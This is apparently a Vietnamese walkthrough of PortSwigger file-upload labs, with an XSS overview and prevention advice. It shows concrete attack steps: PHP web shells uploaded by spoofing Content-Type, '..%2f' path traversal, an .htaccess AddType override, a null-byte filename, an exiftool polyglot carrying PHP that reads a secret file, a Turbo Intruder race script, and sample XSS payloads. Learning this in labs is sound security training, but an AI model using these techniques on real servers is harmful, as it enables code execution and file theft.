<p><img src="file-upload/basic-rce/rce-webshell-upload/upload.jpg" alt="Tải RCE lên hệ thống"></p>
<p>Và cũng nhận được thông báo là tệp chứa RCE đã tải lên thành công:</p>
<p><img src="file-upload/basic-rce/rce-webshell-upload/after-upload.jpg" alt="Tải RCE lên hệ thống"></p>
<p>Thử truy cập vào nơi cất giữ các hình ảnh avatar của hệ thống thì ta được hệ thống trả về một string có vẻ như là bí mật của chú Carlos:</p>
<p><img src="file-upload/basic-rce/rce-webshell-upload/secret.jpg" alt="Tải RCE lên hệ thống"></p>
<p>Submit bài lab với string vừa tiềm được thì ta đã thành công thực hiện upload một RCE code lên hệ thống PHP khi web server không xác thực “loại tệp” mà người dùng tải lên hệ thống:</p>
<p><img src="file-upload/basic-rce/rce-webshell-upload/solved.jpg" alt="Tải RCE lên hệ thống"></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="lab-web-shell-upload-via-content-type-restriction-bypass"><a class="header" href="#lab-web-shell-upload-via-content-type-restriction-bypass">Lab: Web shell upload via Content-Type restriction bypass</a></h1>
<p><strong>Link:</strong> <a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass">https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass</a></p>
<p><img src="file-upload/basic-rce/content-type-restrictions-bypass/lab.jpg" alt="Lab Content-Type restriction-bypass"></p>
<h2 id="giới-thiệu-1"><a class="header" href="#giới-thiệu-1">Giới thiệu</a></h2>
<p>Với website, khi ta gửi một HTML form lên hệ thống, trình duyệt sẽ gửi đi một yêu cầu POST trong đó chức các thông tin của yêu cầu đó. Thông thường, các trình duyệt gửi đi các yêu cầu với thuộc tính Content-Type là <code>application/x-www-form-url-encoded</code>.</p>
<p>Đối với các hệ thống khác nhau, Content-Type được sử dụng các giá trị khác nhau để phù hợp nhất. Bài lab này sẽ yêu cầu ta thực hiện khai thác đánh lừa hệ thống để gửi lên web server một RCE code.</p>
<h2 id="phân-tích-9"><a class="header" href="#phân-tích-9">Phân tích</a></h2>
<p>Tương tự như bài lab ở trên, ta thực hiện login vào hệ thống và thử “test” hệ thống bằng cách tải lên tệp <em>1.php</em> mà mình đã sử dụng ở lab trước thì nhận được thông báo:</p>
<p><img src="file-upload/basic-rce/content-type-restrictions-bypass/try.jpg" alt="Thử tải RCE code"></p>
<p>Như vậy, hệ thống không cho phép ta tải lên các thể loại tệp thuộc về <strong>application/octet-stream</strong> mà chỉ cho tải lên tệp loại <strong>image/jpeg</strong> hoặc <strong>image/png</strong></p>
<h2 id="khai-thác-15"><a class="header" href="#khai-thác-15">Khai thác</a></h2>
<p>Đến đây, ta sử dụng Burp Repeater để thử đổi Content-Type sang yêu cầu của Lab và gửi lên web server. Mình sẽ sử dụng request bị dính lỗi khi thử upload <em>1.php</em> lên hệ thống và đổi lại Content-Type thôi:</p>
<p><img src="file-upload/basic-rce/content-type-restrictions-bypass/burp-send.jpg" alt="Thử tải RCE code"></p>
<p>Ta thấy, file <em>1.php</em> đã được tải lên hệ thống. Bây giờ, ta cần GET tệp này bằng path như ở lab bên trên:</p>
<p><img src="file-upload/basic-rce/content-type-restrictions-bypass/after.jpg" alt="Thử tải RCE code"></p>
<p>Đến đây, ta đã có được secret của chủ Carlos thân yêu và submit thôi:</p>
<p><img src="file-upload/basic-rce/content-type-restrictions-bypass/submit.jpg" alt="Thử tải RCE code"></p>
<p>Kết quả là chúng ta đã thực hiện khai thác lỗ hổng file upload bằng cách đánh lừa hệ thống khi nó quên xác thực Content-Type của tệp:</p>
<p><img src="file-upload/basic-rce/content-type-restrictions-bypass/solved.jpg" alt="Thử tải RCE code"></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="lab-web-shell-upload-via-path-traversal"><a class="header" href="#lab-web-shell-upload-via-path-traversal">Lab: Web shell upload via path traversal</a></h1>
<p><strong>Link:</strong> <a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal">https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal</a></p>
<p><img src="file-upload/basic-rce/path-traversal/lab.jpg" alt="Lab RCE Path Traversal"></p>
<h2 id="giới-thiệu-2"><a class="header" href="#giới-thiệu-2">Giới thiệu</a></h2>
<p>Một trong những cách các website đối phó với lỗ hổng upload file đó chính là chỉ cho phép server thực thi các tệp được cho phép. Nếu các extension của file không nằm trong cấu hình của server, server có thể trả về các thông báo lỗi hoặc nội dung với <strong>Content-Type: text/plain</strong>.</p>
<p>Điều này vô hình chung có thể dẫn đến attacker lợi dụng để soi source code từ server hoặc các tệp riêng tư của server.</p>
<p>Trong bài lab này, tác giả yêu cầu ta thực hiện upload một RCE code lên server và lợi dụng path traversal để có thể leak được secret của chú Carlos</p>
<h2 id="phân-tích-10"><a class="header" href="#phân-tích-10">Phân tích</a></h2>
<p>Tương tự các phần bên trên, trước tiên, ta thử upload đoạn payload của tệp 1.php lên hệ thống:</p>
<p><img src="file-upload/basic-rce/path-traversal/upload-shell.jpg" alt="Thử upload RCE webshell"></p>
<p>Ta có thể thấy, server cho phép ta tải tệp lên dù cho nó là .php (có thể thực thi). Nhưng ở lab này, các file này không thể thực thi trong folder của user (một cách ngăn chặn khai thác lỗ hổng upload file) và server trả về nội dung của file ta upload dưới dạng <strong>Content-Type: text/plain</strong> như nãy mình có đề cập.</p>
<h2 id="khai-thác-16"><a class="header" href="#khai-thác-16">Khai thác</a></h2>
<p>Từ đó, ta có thể sử dụng kỹ thuật <em>directory traversal</em> để kiểm tra xem các folder khác (folder con hoặc folder cha) có cho phép thực thi hay không (thường thì server sẽ block user thôi hehe). Ở đây, mình sẽ sửa đổi request POST ban nãy mình upload file 1.php lên ở chỗ Content-Disposition từ <code>filename="1.php"</code> thành <code>filename="../1.php"</code>:</p>
<p><img src="file-upload/basic-rce/path-traversal/try-bypass.jpg" alt="Thử directory traversal"></p>
<p>Ohno, có vẻ như không thể upload ra một folder khác bằng cách sử dụng <code>../</code>. Ta thử một cách khác đó chính là sử dụng URL encoding đổi <code>"../"</code> thành <code>"..%2f"</code>:</p>
<p><img src="file-upload/basic-rce/path-traversal/bypass.jpg" alt="Bypassed"></p>
<p>Như vậy, ta đã upload thành công file 1.php lên một thư mục khác với folder của user. Dùng Burp Suite để request đến <code>/files/avatars/1.php</code> để xem bí mật của chú Carlos thôi:</p>
<p><img src="file-upload/basic-rce/path-traversal/flag.jpg" alt="Bí mật của chú Carlos"></p>
<p>Và submit để hoàn thành bài lab này</p>
<p><img src="file-upload/basic-rce/path-traversal/solved.jpg" alt="Submit"></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="file-upload---bypass-techniques"><a class="header" href="#file-upload---bypass-techniques">File Upload - Bypass Techniques</a></h1>
<blockquote>
<p><strong>Kỹ thuật bypass validation trong file upload</strong></p>
<p>Các labs trong phần này tập trung vào việc bypass các cơ chế validation khác nhau.</p>
</blockquote>
<h2 id="giới-thiệu-3"><a class="header" href="#giới-thiệu-3">Giới thiệu</a></h2>
<p>Các hệ thống thường triển khai nhiều lớp bảo vệ để ngăn chặn file upload attacks:</p>
<ul>
<li>Blacklist các extension nguy hiểm</li>
<li>Kiểm tra file signature/magic bytes</li>
<li>Validate file content</li>
</ul>
<p>Tuy nhiên, nếu không được implement cẩn thận, các cơ chế này đều có thể bị bypass.</p>
<h2 id="labs-5"><a class="header" href="#labs-5">Labs</a></h2>
<h3 id="web-shell-upload-via-extension-blacklist-bypass"><a class="header" href="#web-shell-upload-via-extension-blacklist-bypass"><a href="#lab-web-shell-upload-via-extension-blacklist-bypass">Web shell upload via extension blacklist bypass</a></a></h3>
<p>Bypass blacklist extension bằng cách upload file .htaccess để thêm extension mới.</p>
<h3 id="web-shell-upload-via-obfuscated-file-extension"><a class="header" href="#web-shell-upload-via-obfuscated-file-extension"><a href="#lab-web-shell-upload-via-obfuscated-file-extension">Web shell upload via obfuscated file extension</a></a></h3>
<p>Sử dụng null byte (%00) để bypass validation extension.</p>
<h3 id="remote-code-execution-via-polyglot-web-shell-upload"><a class="header" href="#remote-code-execution-via-polyglot-web-shell-upload"><a href="#lab-remote-code-execution-via-polyglot-web-shell-upload">Remote code execution via polyglot web shell upload</a></a></h3>
<p>Tạo polyglot file - vừa là image hợp lệ vừa chứa PHP code để bypass file signature validation.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="lab-web-shell-upload-via-extension-blacklist-bypass"><a class="header" href="#lab-web-shell-upload-via-extension-blacklist-bypass">Lab: Web shell upload via extension blacklist bypass</a></h1>
<p><strong>Link:</strong> <a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass">https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass</a></p>
<p><img src="file-upload/bypass-techniques/blacklist-bypass/lab.jpg" alt="Lab blacklist bypass"></p>
<h2 id="giới-thiệu-4"><a class="header" href="#giới-thiệu-4">Giới thiệu</a></h2>
<p>Trong các phần trên, mình đã có đề cập đến việc sử dụng blacklist để block các loại tệp nguy hiểm. Tuy vậy, các web server vẫn có thể mắc phải các lỗi như cấu hình thiếu chặt chẽ, quản lý file hời hợt khiến attacker có thể dễ dàng “ghi đè” lên tệp cấu hình của server hoặc bypass được blacklist.</p>
<p>Với Apache, server có thể thực thi một tệp PHP theo request và ông dev ổng có thể thêm những cấu hình như cho phép load module nào hoặc thêm các file extension nào lên tệp config (apache2.conf). Bên cạnh đó, nhiều server còn cho phép ông dev upload ghi đè tệp hoặc thêm content vào tệp config. Ví dụ như trong Apache server, nó cho phép load lên một tệp cấu hình cụ thể cho server nếu như trên apache server tồn tại tệp <code>.htaccess</code>.</p>
<p>Trong bài lab này, tác giả yêu cầu ta thực hiện bypass blacklist extension.</p>
<h2 id="phân-tích-11"><a class="header" href="#phân-tích-11">Phân tích</a></h2>
<p>Đầu tiên, mình sẽ thử POST file 1.php lên server:</p>
<p><img src="file-upload/bypass-techniques/blacklist-bypass/info-apache.jpg" alt="Thử gửi 1.php lên server"></p>
<p>Kết quả trả về Burp Suite cho thấy, server sử dụng Apache2 và file của mình không lên upload lên vì server chặn tệp .php.</p>
<h2 id="khai-thác-17"><a class="header" href="#khai-thác-17">Khai thác</a></h2>
<p>Như mình có đề cập, các dev có thể linh hoạt thêm vào tệp config (đối với Apache server) các loại tệp sẽ được “cho phép” thực thi trên server. Trong <code>htaccess</code>, mấy ông dev chỉ cần thêm dòng <code>AddType application/x-httpd-php {.extension_cần_thêm}</code>, server sẽ tự override nó vào <code>/etc/apache2/apache2.conf</code>. Lợi dụng điều này, ta sẽ sử dụng Burp Repeater để gửi đi 1 POST mới và gắn cái dòng AddType ở bên trên vào filename .htaccess:</p>
<p><img src="file-upload/bypass-techniques/blacklist-bypass/addtype.jpg" alt="Thêm .nh4ttruong extension cho file"></p>
<p>Ta đã thành công gửi file .htaccess lên server. Trong request đó, bạn có thể thấy mình đã gửi request POST và thêm extension mới là .nh4ttruong vào .htaccess (tệp config). Bây giờ, ta thử POST 1 request mới lên server với extension mới:</p>
<p><img src="file-upload/bypass-techniques/blacklist-bypass/send-rce.jpg" alt="Gửi RCE code webshell"></p>
<p>Thành công rồi hehe, file đã lên được server, việc của ta bậy giờ là GET lại file đó thể thực thi nó:</p>
<p><img src="file-upload/bypass-techniques/blacklist-bypass/lab.jpg" alt="GET bí mật của chú Carlos"></p>
<p>Và submit bí mật của chú ấy thôi:</p>
<p><img src="file-upload/bypass-techniques/blacklist-bypass/solved.jpg" alt="Submit"></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="lab-web-shell-upload-via-obfuscated-file-extension"><a class="header" href="#lab-web-shell-upload-via-obfuscated-file-extension">Lab: Web shell upload via obfuscated file extension</a></h1>
<p><strong>Link:</strong> <a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension">https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension</a></p>
<h2 id="giới-thiệu-5"><a class="header" href="#giới-thiệu-5">Giới thiệu</a></h2>
<p>Ở bài lab này, tác giả sẽ yêu cầu ta bypass blacklist các extension của file.</p>
<h2 id="phân-tích-12"><a class="header" href="#phân-tích-12">Phân tích</a></h2>
<p>Thử upload 1.php như các lab khác lên server:</p>
<p><img src="file-upload/bypass-techniques/obfuscated-extensions/tryupload.jpg" alt="Thử upload RCE"></p>
<p>Thông báo trả về là ta chỉ có thể upload các extension về hình ảnh (JPG/PNG). Một trong 7749 cách bypass blacklist tiếp theo mình có thể sử dụng đó chính là bypass extension của file với việc sử dụng các trường hợp <strong>case sensitive</strong> để đánh lừa bộ xác thực của website.</p>
<h2 id="khai-thác-18"><a class="header" href="#khai-thác-18">Khai thác</a></h2>
<p>Ký tự <code>NULL</code> hay <code>%00</code> là một trong những ký tự đặc biệt sẽ có thể khiến bộ xác thực hiểu rằng sau nó không còn gì cả và ta thử bằng cách chèn nó vào như sau:</p>
<p><img src="file-upload/bypass-techniques/obfuscated-extensions/changefilename.jpg" alt="Chèn ký tự NULL"></p>
<p>Như đã thấy, file 1.php đã upload thành công lên server. Và tương tự như các lab trên, GET bí mật và submit thôi</p>
<p><img src="file-upload/bypass-techniques/obfuscated-extensions/bypass.jpg" alt="GET bí mật của chú Carlos"></p>
<p><img src="file-upload/bypass-techniques/obfuscated-extensions/solved.jpg" alt="Submit"></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="lab-remote-code-execution-via-polyglot-web-shell-upload"><a class="header" href="#lab-remote-code-execution-via-polyglot-web-shell-upload">Lab: Remote code execution via polyglot web shell upload</a></h1>
<p><strong>Link:</strong> <a href="https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload">https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload</a></p>
<p><img src="file-upload/bypass-techniques/polyglot-webshell/lab.jpg" alt="Lab"></p>
<h2 id="giới-thiệu-6"><a class="header" href="#giới-thiệu-6">Giới thiệu</a></h2>
<p>Để tăng mức độ bảo mật cho hệ thống, các server thay vì xác thực Content-Type thì nó sẽ xác thực nội dung của file. Ví dụ, các file hình ảnh JPEG luôn bắt đầu bằng chuỗi bytes <code>FF D8 FF</code>.</p>
<p>Bài lab này sẽ thử thách ta bypass mà không thể thay đổi extension của file.</p>
<h2 id="phân-tích-13"><a class="header" href="#phân-tích-13">Phân tích</a></h2>
<p>Thử upload 1.php lên server và kết quả trả về:</p>
<p><img src="file-upload/bypass-techniques/polyglot-webshell/error.jpg" alt="Thử upload 1.php"></p>
<p>Ta có thể tải bất kỳ tệp nào lên server nhưng phải thỏa mãn nó là hình ảnh (PNG/JPG) vì nó là avatar mà. Server sẽ xác thực signature của file như ví dụ mình nêu trên. Do đó, ta sẽ sử dụng trick để “ép” 1 file chứa RCE code thành 1 file thỏa điều kiện của server.</p>
<h2 id="khai-thác-19"><a class="header" href="#khai-thác-19">Khai thác</a></h2>
<p><a href="https://github.com/exiftool/exiftool">exiftool</a> là một trong những công cụ tối ưu hỗ trợ việc thay đổi metadata của file. Ta sẽ sử dụng nó để thay đổi “dấu hiệu” trong file để làm server nghĩ rằng đó là một file hình ảnh và ta sẽ thêm <code>-Comment="&lt;?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?&gt;"</code> vào file exploit.php mà exiftool sẽ tạo ra:</p>
<p><img src="file-upload/bypass-techniques/polyglot-webshell/create-polygot.jpg" alt="Sử dụng exiftool"></p>
<p>Upload <a href="file-upload/bypass-techniques/polyglot-webshell/exploit.php">exploit.php</a> lên server:</p>
<p><img src="file-upload/bypass-techniques/polyglot-webshell/upload.jpg" alt="Upload exploit.php lên server"></p>
<p>Server không chặn việc ta tải lên nữa rồi =)))). GET bí mật bằng cách cho nó thực thi thôi:</p>
<p><img src="file-upload/bypass-techniques/polyglot-webshell/bypass.jpg" alt="Lab"></p>
<p>Và submit bí mật:</p>
<p><img src="file-upload/bypass-techniques/polyglot-webshell/solved.jpg" alt="Submit"></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="file-upload---advanced-techniques"><a class="header" href="#file-upload---advanced-techniques">File Upload - Advanced Techniques</a></h1>
<blockquote>
<p><strong>Race Condition trong File Upload</strong></p>
<p>Lab trong phần này tập trung vào kỹ thuật advanced - Race Condition.</p>
</blockquote>
<h2 id="giới-thiệu-7"><a class="header" href="#giới-thiệu-7">Giới thiệu</a></h2>
<p>Race Condition trong file upload xảy ra khi:</p>
<ol>
<li>File được upload lên server và lưu tạm</li>
<li>Server validate file</li>
<li>Nếu file nguy hiểm, server xóa file</li>
</ol>
<p>Nếu attacker có thể thực thi file trong khoảng thời gian giữa bước 1 và 3 (trước khi bị xóa), RCE có thể đạt được.</p>
<h2 id="kỹ-thuật"><a class="header" href="#kỹ-thuật">Kỹ thuật</a></h2>
<p>Để khai thác race condition:</p>
<ul>
<li>Upload file với extension hợp lệ (ví dụ: <code>.php.png</code>)</li>
<li>Gửi nhiều request GET đến file đó cùng lúc</li>
<li>Hy vọng một request GET sẽ thực thi trước khi server xóa file</li>
</ul>
<h2 id="lab"><a class="header" href="#lab">Lab</a></h2>
<h3 id="web-shell-upload-via-race-condition"><a class="header" href="#web-shell-upload-via-race-condition"><a href="#lab-web-shell-upload-via-race-condition">Web shell upload via race condition</a></a></h3>
<p>Sử dụng Turbo Intruder để khai thác race condition và thực thi web shell trước khi bị xóa.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="lab-web-shell-upload-via-race-condition"><a class="header" href="#lab-web-shell-upload-via-race-condition">Lab: Web shell upload via race condition</a></h1>
<p><strong>Link:</strong> <a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition">https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition</a></p>
<p><img src="file-upload/advanced-techniques/race-condition/lab.jpg" alt="Lab"></p>
<h2 id="giới-thiệu-8"><a class="header" href="#giới-thiệu-8">Giới thiệu</a></h2>
<p>Race conditions trong khai thác lỗ hổng file upload là trường hợp xảy ra cho phép bạn có thể upload một file thông qua URL. Server sẽ fetch file của bạn và tạo một bản copy cục bộ trước khi nó bị xác thực.</p>
<p>Ngày nay, các hệ thống càng ngày càng thay đổi để có thể ngăn chặn các cuộc tấn công file upload. Họ sử dụng một nơi lưu trữ tạm thời để lưu trữ tệp, sau đó thay đổi tên ngẫu nhiên tên của tệp và bắt đầu xác thực nó. Tệp nào độc hại thì loại bỏ tệp nào ổn thì sẽ cho phép upload vào nơi lưu trữ gốc. Điều này dường như bất khả thi để dò ra nó tên gì để attacker thực thi nó nếu may mắn vượt qua vòng xác thực.</p>
<h2 id="phân-tích-14"><a class="header" href="#phân-tích-14">Phân tích</a></h2>
<p>Vỏ quýt dày có móng tay nhọn. Đó là câu mà ông cha ta đã dạy, để bypass cái cách này, ta có thể sử dụng trick để khiến cho quá trình chuyển đổi giữa các bước bị delay để RCE code có thể thực thi trên server.</p>
<p>Ta thực hiện các bước tương tự như các lab ở trên thì thấy hệ thống không cho phép ta upload 1.php lên:</p>
<p><img src="file-upload/advanced-techniques/race-condition/error.jpg" alt="Thử upload 1.php"></p>
<p>Thử đổi file thành <code>hehe.php.png</code> và upload lên hệ thống thì có hệ thống đã cho phép tải RCE code lên nhưng dưới extension PNG :3</p>
<p><img src="file-upload/advanced-techniques/race-condition/changefile.jpg" alt="Đổi thành hehe.php.png"></p>
<h2 id="khai-thác-20"><a class="header" href="#khai-thác-20">Khai thác</a></h2>
<p>Sau đó, sử dụng tiện ích <a href="https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988">Turbo Intruder</a> trong Burp Store để có thể intruder theo ý ta muốn.</p>
<p>Trong HTTP History, ta tìm kiếm request mà đã upload thành công hehe.php.png, sau đó chuột phải -&gt; Extensions -&gt; Turbo Intruders -&gt; Send to Turbo Intruder:</p>
<p><img src="file-upload/advanced-techniques/race-condition/sendtoturbo.jpg" alt="Gửi qua Turbo Intruders"></p>
<p>Tiếp theo, ta sử dụng <a href="file-upload/advanced-techniques/race-condition/turbo-sample.py">đoạn code dưới đây</a> và thay đổi <code>&lt;YOUR-POST-REQUEST&gt;</code> thành request POST đã gửi thành công file hehe.php.png, thay đổi <code>&lt;YOUR-GET-REQUEST&gt;</code> thành request đến <code>/files/avatars/hehe.php.png</code>. Đại loại thì đoạn code này sẽ giúp cho request của ta được tồn tại lâu hơn và tệp hehe.php (sau khi bỏ .png ở các request thay đổi) có thể thực thi trên server:</p>
<pre><code class="language-python">def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''&lt;YOUR-POST-REQUEST&gt;'''

    request2 = '''&lt;YOUR-GET-REQUEST&gt;'''

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
</code></pre>
<p><strong>Lưu ý:</strong> Khi đổi xong 2 phần trên, ta cần phải loại bỏ phần <code>.png</code> để có biến nó thành <code>.php</code> để nó có thể thực thi trên hệ thống.</p>
<p>Bây giờ, ta đã config xong xuôi thì bấm Attack và chờ đợi timeout 60s:</p>
<p><img src="file-upload/advanced-techniques/race-condition/bypass.jpg" alt="Nhấn attack thôi"></p>
<p>Ở các request, ta có thể tìm kiếm được bí mật của chú Carlos và submit thôi:</p>
<p><img src="file-upload/advanced-techniques/race-condition/solved.jpg" alt="Submit"></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="cross-site-scripting-xss"><a class="header" href="#cross-site-scripting-xss">Cross-site Scripting (XSS)</a></h1>
<h2 id="lỗ-hổng-cross-site-scripting-xss"><a class="header" href="#lỗ-hổng-cross-site-scripting-xss">Lỗ hổng Cross-site Scripting (XSS)</a></h2>
<p>Cross-site Scripting (XSS) là lỗ hổng cho phép attacker inject malicious scripts vào web pages được xem bởi users khác. Attacker có thể:</p>
<ul>
<li>Đánh cắp session tokens, cookies</li>
<li>Thực hiện actions thay mặt victim</li>
<li>Đọc/modify nội dung trang web</li>
<li>Phishing và social engineering</li>
</ul>
<p><img src="xss/xss-work.png" alt="Cách XSS hoạt động"></p>
<p>Thông thường, để kiểm tra XSS người ta dùng <code>alert()</code> hoặc <code>print()</code> để trigger popup.</p>
<h2 id="các-loại-xss"><a class="header" href="#các-loại-xss">Các loại XSS</a></h2>
<p>XSS được chia thành 3 loại chính:</p>
<h3 id="reflected-xss"><a class="header" href="#reflected-xss"><strong>Reflected XSS</strong></a></h3>
<p>Malicious script được truyền qua HTTP request và phản hồi ngay lập tức trong response. Không được lưu trữ.</p>
<p><strong>Ví dụ:</strong> <code>https://vulnerable.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<h3 id="stored-xss"><a class="header" href="#stored-xss"><strong>Stored XSS</strong></a></h3>
<p>Malicious script được lưu vào database và hiển thị cho mọi user truy cập. Nguy hiểm hơn Reflected XSS.</p>
<p><strong>Ví dụ:</strong> Comment, profile bio, forum posts</p>
<h3 id="dom-based-xss"><a class="header" href="#dom-based-xss"><strong>DOM-based XSS</strong></a></h3>
<p>Lỗ hổng xảy ra ở client-side khi JavaScript xử lý data không an toàn từ DOM sources (URL, localStorage, etc.)</p>
<h2 id="labs---danh-sách-các-bài-thực-hành-2"><a class="header" href="#labs---danh-sách-các-bài-thực-hành-2">Labs - Danh sách các bài thực hành</a></h2>
<h3 id="1-reflected-xss"><a class="header" href="#1-reflected-xss">1. Reflected XSS</a></h3>
<p><a href="xss/reflected-xss/readme.html">Các lab về Reflected XSS</a></p>
<h4 id="html-context"><a class="header" href="#html-context">HTML Context</a></h4>
<ul>
<li><a href="#lab-reflected-xss-into-html-context-with-nothing-encoded">Reflected XSS with nothing encoded</a></li>
<li><a href="#lab-reflected-xss-into-html-context-with-most-tags-and-attributes-blocked">Reflected XSS with most tags and attributes blocked</a></li>
<li><a href="#lab-reflected-xss-into-html-context-with-all-tags-blocked-except-custom-ones">Reflected XSS with all tags blocked except custom ones</a></li>
<li><a href="#lab-reflected-xss-with-event-handlers-and-href-attributes-blocked">Reflected XSS with event handlers and href blocked</a></li>
<li><a href="#lab-reflected-xss-with-some-svg-markup-allowed">Reflected XSS with some SVG markup allowed</a></li>
<li><a href="#lab-reflected-xss-into-attribute-with-angle-brackets-html-encoded">Reflected XSS with angle brackets HTML-encoded</a></li>
<li><a href="#lab-reflected-xss-in-canonical-link-tag">Reflected XSS in canonical link tag</a></li>
</ul>
<h4 id="javascript-context"><a class="header" href="#javascript-context">JavaScript Context</a></h4>
<ul>
<li><a href="#lab-reflected-xss-into-a-javascript-string-with-single-quote-and-backslash-escaped">Reflected XSS with single quote and backslash escaped</a></li>
<li><a href="xss/reflected-xss/js-angle-brackets-encoded.html">Reflected XSS with angle brackets encoded</a></li>
<li><a href="xss/reflected-xss/js-all-encoded-escaped.html">Reflected XSS with all encoded and escaped</a></li>
</ul>
<h3 id="2-stored-xss"><a class="header" href="#2-stored-xss">2. Stored XSS</a></h3>
<p><a href="xss/stored-xss/readme.html">Các lab về Stored XSS</a></p>
<p><em>Coming soon…</em></p>
<h3 id="3-dom-based-xss"><a class="header" href="#3-dom-based-xss">3. DOM-based XSS</a></h3>
<p><em>Coming soon…</em></p>
<h2 id="cách-phòng-chống-xss"><a class="header" href="#cách-phòng-chống-xss">Cách phòng chống XSS</a></h2>
<h3 id="input-validation--output-encoding"><a class="header" href="#input-validation--output-encoding">Input Validation &amp; Output Encoding</a></h3>
<ul>
<li><strong>Encode output</strong>: HTML encode <code>&lt; &gt; " ' &amp;</code> khi hiển thị user input</li>
<li><strong>Context-aware encoding</strong>: HTML context khác JavaScript context khác URL context</li>
<li><strong>Validate input</strong>: Whitelist allowed characters</li>
<li><strong>Sanitize HTML</strong>: Nếu cho phép HTML, dùng library như DOMPurify</li>
</ul>
<h3 id="content-security-policy-csp"><a class="header" href="#content-security-policy-csp">Content Security Policy (CSP)</a></h3>
<p>Sử dụng CSP headers để restrict nguồn scripts có thể chạy:</p>
<pre><code>Content-Security-Policy: script-src 'self' https://trusted.cdn.com
</code></pre>
<h3 id="httponly--secure-cookies"><a class="header" href="#httponly--secure-cookies">HTTPOnly &amp; Secure Cookies</a></h3>
<ul>
<li>Set <code>HttpOnly</code> flag để JavaScript không đọc được cookies</li>
<li>Set <code>Secure</code> flag để cookies chỉ gửi qua HTTPS</li>
</ul>
<h3 id="framework-protection"><a class="header" href="#framework-protection">Framework Protection</a></h3>
<p>Modern frameworks như React, Angular, Vue tự động escape output. Tuy nhiên vẫn cần cẩn thận với:</p>
<ul>
<li><code>dangerouslySetInnerHTML</code> (React)</li>
<li><code>bypassSecurityTrustHtml</code> (Angular)</li>
<li><code>v-html</code> (Vue)</li>
</ul>
<h2 id="tài-nguyên-tham-khảo-2"><a class="header" href="#tài-nguyên-tham-khảo-2">Tài nguyên tham khảo</a></h2>
<ul>
<li><a href="https://portswigger.net/web-security/cross-site-scripting">PortSwigger XSS Guide</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">OWASP XSS Prevention Cheat Sheet</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html">XSS Filter Evasion Cheat Sheet</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="xss---reflected-xss"><a class="header" href="#xss---reflected-xss">XSS - Reflected XSS</a></h1>
<p>Reflected XSS xảy ra khi một website có chức năng search và filter với URL như sau: <code>https://insecure-website.com/search?term=gift</code>. Nếu website dính Reflected XSS, attacker có thể lợi dụng để tấn công bằng cách truyền vào <code>term</code> parameter dạng: <code>https://insecure-website.com/search?term=&lt;script&gt;alert("Hehe website is hacked")&lt;/script&gt;</code>.</p>
<h2 id="html-context-labs"><a class="header" href="#html-context-labs">HTML Context Labs</a></h2>
<ul>
<li><a href="#lab-reflected-xss-into-html-context-with-nothing-encoded">Reflected XSS with nothing encoded</a></li>
<li><a href="#lab-reflected-xss-into-html-context-with-most-tags-and-attributes-blocked">Reflected XSS with most tags and attributes blocked</a></li>
<li><a href="#lab-reflected-xss-into-html-context-with-all-tags-blocked-except-custom-ones">Reflected XSS with all tags blocked except custom ones</a></li>
<li><a href="#lab-reflected-xss-with-event-handlers-and-href-attributes-blocked">Reflected XSS with event handlers and href blocked</a></li>
<li><a href="#lab-reflected-xss-with-some-svg-markup-allowed">Reflected XSS with some SVG markup allowed</a></li>
<li><a href="#lab-reflected-xss-into-attribute-with-angle-brackets-html-encoded">Reflected XSS with angle brackets HTML-encoded</a></li>
<li><a href="#lab-reflected-xss-in-canonical-link-tag">Reflected XSS in canonical link tag</a></li>
</ul>
<h2 id="javascript-context-labs"><a class="header" href="#javascript-context-labs">JavaScript Context Labs</a></h2>
<ul>
<li><a href="#lab-reflected-xss-into-a-javascript-string-with-single-quote-and-backslash-escaped">Reflected XSS with single quote and backslash escaped</a></li>
<li><a href="xss/reflected-xss/js-angle-brackets-encoded.html">Reflected XSS with angle brackets encoded</a></li>
<li><a href="xss/reflected-xss/js-all-encoded-escaped.html">Reflected XSS with all encoded and escaped</a></li>
</ul>
<h2 id="tổng-quan-4"><a class="header" href="#tổng-quan-4">Tổng quan</a></h2>
<p>Reflected XSS techniques bao gồm:</p>
<ul>
<li>Bypass HTML encoding</li>
<li>Bypass tag/attribute filtering</li>
